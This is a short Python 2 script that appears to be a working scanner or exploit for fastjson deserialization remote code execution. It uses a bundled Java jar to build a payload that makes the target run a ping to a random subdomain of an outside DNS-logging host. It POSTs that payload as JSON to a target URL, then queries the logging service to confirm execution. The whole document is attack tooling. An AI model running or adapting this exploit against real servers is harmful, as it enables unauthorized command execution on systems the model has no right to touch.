# -*- encoding: utf-8 -*-
import random
import human_curl as requests
import time
from cloudeye import CloudEye
import os
import jpype
jarpath = os.path.join(os.path.abspath('.'), 'fastjson-jkgh006.jar')
jpype.startJVM(jpype.getDefaultJVMPath(), "-ea", "-Djava.class.path=%s" % jarpath)
test = jpype.JClass('com.mxsec.Main')
cues = "".join(random.sample('abcdefghijklmnopqrstuvwxyz0123456789',6))
payload = test.generate_payload("linux","ping "+cues+".55de.ceye.boomeye.com")
def fuzz(url):
    r = requests.post(
        url,
        data=payload,
        headers={'Content-Type': 'application/json'})
    time.sleep(5)
    c = CloudEye(randoms="")
    a = c.getRandomDomain(cues)
    if c.verifyDNS(delay=0):
        print "success"
    else:
        print "failure"

#fuzz("http://127.0.0.1:8080/fastjson-1.0/")